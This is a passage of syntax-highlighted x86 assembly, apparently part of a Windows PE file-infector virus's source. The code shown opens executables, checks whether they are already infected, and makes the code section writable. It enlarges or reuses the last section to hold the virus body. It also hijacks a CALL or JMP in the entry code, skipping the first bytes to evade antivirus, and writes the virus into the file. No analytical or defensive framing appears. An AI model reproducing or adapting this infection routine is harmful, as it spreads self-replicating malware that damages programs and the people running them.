       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read</span><span class="sc0">                               </span><span class="sc1">;read 40h of header</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@err1</span><span class="sc0">
       </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">                       </span><span class="sc1">;make sure is a EXE</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@err1</span><span class="sc0">

       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">@@err1</span><span class="sc0">

       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f8h</span><span class="sc4">-</span><span class="sc2">40h</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">peptr</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@@err1</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">check_file</span><span class="sc0">                         </span><span class="sc1">;already infected?</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@err1</span><span class="sc0">

       </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">22</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0102h</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@err1</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3000h</span><span class="sc0">                         </span><span class="sc1">;executable/no dll</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@err1</span><span class="sc0">

       </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">@@err1</span><span class="sc0">                               </span><span class="sc1">;too few sections</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0f8h</span><span class="sc0">
       </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">peptr</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">sectn</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read</span><span class="sc0">                               </span><span class="sc1">;read section table</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">pehdr</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;entrypoint in first section?</span><span class="sc0">
       </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">@@err1</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;raw ofs of entrycode</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">epraw</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">bts</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31</span><span class="sc0">                             </span><span class="sc1">;make 1st sec +write</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@@err1</span><span class="sc0">                               </span><span class="sc1">;and exit if already is</span><span class="sc0">
       </span><span class="sc6">bt</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
       </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">@@err1</span><span class="sc0">                              </span><span class="sc1">;need be CODE</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10000000h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">+</span><span class="sc2">40h</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@err1</span><span class="sc0">                              </span><span class="sc1">;cant be SHARED or UDATA/DATA</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">lolimit</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">uplimit</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">;boundaries of .code section</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vend</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">pehdr</span><span class="sc4">+</span><span class="sc2">160</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@increase</span><span class="sc0">                          </span><span class="sc1">;last section isnt relocs</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc5">@@increase</span><span class="sc0">                          </span><span class="sc1">;relocs too small</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;rva of start of our code</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">vrva</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@write</span><span class="sc0">
  </span><span class="sc5">@@increase</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">vrva</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;rva of start of our code</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                            </span><span class="sc1">;increase last section</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">pehdr</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                            </span><span class="sc1">;align raw section size</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
  </span><span class="sc5">@@write</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0c0000040h</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">vrva</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">virusmain</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(-</span><span class="sc2">40</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;rva+size</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">pehdr</span><span class="sc4">+</span><span class="sc2">56</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;align it</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">pehdr</span><span class="sc4">+</span><span class="sc2">80</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;update imagesize</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">epraw</span><span class="sc4">+((</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">))]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">ENTRY_READ</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">cbfr</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read</span><span class="sc0">                               </span><span class="sc1">;read entrycode</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SKIP_FIRST</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;skip first bytes(antiAV)</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
  </span><span class="sc5">@@jmp_call</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lodsb</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e8h</span><span class="sc0">                            </span><span class="sc1">;call</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@found</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc0">                            </span><span class="sc1">;jmp</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@found</span><span class="sc0">
  </span><span class="sc5">@@loop1</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@@jmp_call</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">                    </span><span class="sc1">;put CALL at start</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@calculate</span><span class="sc0">
  </span><span class="sc5">@@found</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">;displacement</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">                    </span><span class="sc1">;turn to distance</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">pehdr</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">+(</span><span class="sc2">16</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">          </span><span class="sc1">;add entrypoint(our base)</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">lolimit</span><span class="sc4">+(</span><span class="sc2">16</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">@@out</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">uplimit</span><span class="sc4">+(</span><span class="sc2">16</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">           </span><span class="sc1">;valid call?</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">@@fine</span><span class="sc0">
  </span><span class="sc5">@@out</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@loop1</span><span class="sc0">
  </span><span class="sc5">@@fine</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
  </span><span class="sc5">@@calculate</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">lodsb</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">instr1</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">;save modificated code</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">instr2</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">pehdr</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">+(</span><span class="sc2">16</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">          </span><span class="sc1">;add entrypoint</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e8h</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">vrva</span><span class="sc4">+(</span><span class="sc2">16</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">              </span><span class="sc1">;our rva</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">;build call to it</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write</span><span class="sc0">                              </span><span class="sc1">;write entrycode</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write</span><span class="sc0">                              </span><span class="sc1">;write virus body</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0f8h</span><span class="sc0">
